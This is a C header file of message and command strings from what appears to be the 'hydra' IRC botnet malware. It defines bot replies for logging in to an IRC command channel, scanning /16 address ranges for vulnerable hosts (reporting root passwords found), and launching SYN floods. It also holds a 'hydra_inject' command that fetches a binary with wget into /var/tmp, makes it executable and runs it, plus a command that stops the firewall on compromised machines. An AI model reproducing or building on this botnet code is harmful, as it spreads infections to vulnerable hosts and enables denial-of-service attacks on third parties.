#ifndef __MESSAGES_H_
#define __MESSAGES_H_

/* reply strings */

#define write_nick_info "NICK %s\n"
#define write_misc_info "USER %s localhost localhost :you know hydra?\n"

#define channel_join "JOIN %s :%s\n"
#define channel_part "PART %s :%s\n"
#define command_who  "WHO %s\n"
#define ping_reply   "PING 31337\n"

#define login_success "PRIVMSG %s :(hydra) You are logged in!, (%s).\n"
#define login_failure "PRIVMSG %s :(hydra) Sorry, wrong authenthication password!\n"
#define logout_success "PRIVMSG %s :(hydra) You are logged out!, (%s).\n"

#define upgrade_advise "PRIVMSG %s :(hydra) upgrading void-binary from: %s/%s!\n"
#define upgrade_failure "PRIVMSG %s :(hydra) upgrade-error, can't replace file \"%s\" with \"%s\"! choose another name.\n"

#define parse_errors "PRIVMSG %s :(hydra) parser: one error found in your input data, see help!\n"

#define start_scan "PRIVMSG %s :(hydra) scan (range: %s.%s.0.0/16) (%s:%s). wait please..\n"
#define start_advscan "PRIVMSG %s :(hydra) advscan (range: %s.%s.0.0/16). wait please..\n"
#define stop_actions "PRIVMSG %s :(hydra) all operations stopped (scanning/flooding)!\n"
#define max_pids_block "PRIVMSG %s :(hydra) can't start! the bot already scanning/attacking\n"

#define check_version "PRIVMSG %s :(hydra) using version: %s\n"

#define check_status "PRIVMSG %s :(hydra) i'am working (scan/dos) on: %s\n"
#define check_nowork "PRIVMSG %s :(hydra) i'am not currently working!\n"

#define start_synflood "PRIVMSG %s :(hydra) synflood start.. (packeting: %s:%u)(s: %u) wait for a down!\n"
#define end_synflood "PRIVMSG %s :(hydra) synflood finished! host get down?!!\n"

#define process_quit "QUIT :hydra says: %s\n"

#define vuln_found_scan "PRIVMSG %s :(hydra) scan, %s is vulnerable! (%s:%s), wait please..\n"
#define vuln_found_advscan "PRIVMSG %s :(hydra) advscan, %s is vulnerable! (root:%s), wait please..\n"

#define complete_scan "PRIVMSG %s :(hydra) scan completed!, (founds: %u)\n"
#define complete_advscan "PRIVMSG %s :(hydra) advscan completed!, (founds: %u)\n"

#define hydra_inject "wget %s/%s -P /var/tmp && chmod +x /var/tmp/%s && /var/tmp/%s &\n"
#define stop_firewall "/etc/firewall_stop\n"

#define start_recursive "PRIVMSG %s :(hydra) recursive (range: %s.%s.0.0/16). wait please..\n"
#define start_recursive_rnd "PRIVMSG %s :(hydra) recursive-random (range: %s.%s.0.0/16). wait please..\n"
#define start_recadvscan_rlst "PRIVMSG %s :(hydra) recursive-rlist (range: %s.%s.0.0/16). wait please..\n"
#define start_recscan_rlst "PRIVMSG %s :(hydra) recursive-rlist (range: %s.%s.0.0/16) (%s:%s). wait please..\n"

#define error_recursive "PRIVMSG %s :(hydra) recursive can't get local interface/ip!\n"
#define error_recursive_rlst "PRIVMSG %s :(hydar) some error found and i can't start recursive-list!\n"
#define error_see_help "PRIVMSG %s :(hydra) command error, see \"!help\" for more information.\n" 
#define error_local_ip "PRIVMSG %s :(hydra) impossible to determinate local address!\n"

#endif
